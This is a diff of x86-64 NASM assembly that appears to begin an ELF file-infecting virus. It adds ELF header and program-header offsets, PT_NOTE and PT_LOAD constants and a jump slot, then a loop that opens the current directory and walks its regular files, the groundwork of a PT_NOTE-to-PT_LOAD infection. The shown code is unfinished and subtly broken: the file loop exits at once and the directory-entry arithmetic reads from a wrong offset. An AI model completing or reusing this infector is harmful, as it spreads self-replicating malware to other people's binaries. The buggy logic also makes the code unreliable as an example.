@@ -11,16 +11,97 @@
 %define SYS_PWRITE64     18
 %define SYS_SYNC         162
 
+%define DT_REG			8
+
+%define SEEK_END		2
+%define DIRENT_BUFFSIZE	1024
+
+%define PT_LOAD			1
+%define PT_NOTE			4
+
 %define O_RDONLY        00000000
 %define O_WRONLY        00000001
 %define O_RDWR          00000002
+
 %define argv0			[rsp + 8]
 %define argc			[rsp + 4]
+
+; r15 + 0 = stack buffer = stat
+; r15 + 48 = stat.st_size
+
+; r15 + 144 = ehdr
+; r15 + 148 = ehdr.class
+; r15 + 152 = ehdr.pad
+; r15 + 168 = ehdr.entry
+; r15 + 176 = ehdr.phoff
+; r15 + 198 = ehdr.phentsize
+; r15 + 200 = ehdr.phnum
+
+; r15 + 208 = phdr = phdr.type
+; r15 + 212 = phdr.flags
+; r15 + 216 = phdr.offset
+; r15 + 224 = phdr.vaddr
+; r15 + 232 = phdr.paddr
+; r15 + 240 = phdr.filesz
+; r15 + 248 = phdr.memsz
+; r15 + 256 = phdr.align
+
+; r15 + 300 = jmp rel
+
+; r15 + 350 = directory size
+
+; r15 + 400 = dirent = dirent.d_ino
+; r15 + 416 = dirent.d_reclen
+; r15 + 418 = dirent.d_type
+; r15 + 419 = dirent.d_name
 
 section .text
 	global _start
 _start:
-	mov r14, argv0 ;save program name
+	mov r14, [rsp + 8]                                          ; saving argv0 to r14
+    push rdx
+    push rsp
+    sub rsp, 5000                                               ; reserving 5000 bytes
+    mov r15, rsp 
+	call load_dir
+	call exit
+load_dir:
+	push "."
+	mov rdi, rsp
+	mov rsi, O_RDONLY
+	mov rdx, 0
+	mov rax, SYS_OPEN
+	syscall
+
+	pop rdi
+	cmp rax, 0
+	jle	err
+
+	mov rdi, rax
+	lea rsi, [r15 + 400]
+	mov rdx, DIRENT_BUFFSIZE
+	mov rax, SYS_GETDENTS64
+	syscall   
+
+	test rax, rax
+	js err
+
+	mov qword [r15 + 350], rax
+	mov rax, SYS_CLOSE
+	syscall
+	
+	xor rcx, rcx
+file_loop:
+	call exit
+	push rcx
+	cmp byte [r15 + 418 + rcx], DT_REG
+	jne .continue
+
+	.continue:
+		pop rcx
+		add cx, word [rcx + 15 + 416]
+		cmp rcx, qword [r15 + 350]
+		jne file_loop
 	call exit
 putstr:
 	call strlen
@@ -30,6 +111,7 @@ putstr:
 	mov rax, SYS_WRITE	;syscall
 	syscall
 	ret
+
 strlen:
 	xor rax, rax
 	.loop:
@@ -42,4 +124,8 @@ strlen:
 exit:
 	mov rax, SYS_EXIT
 	mov rdi, 0
+	syscall
+err:
+	mov rax, SYS_EXIT
+	mov rdi, 0xfffffff
 	syscall
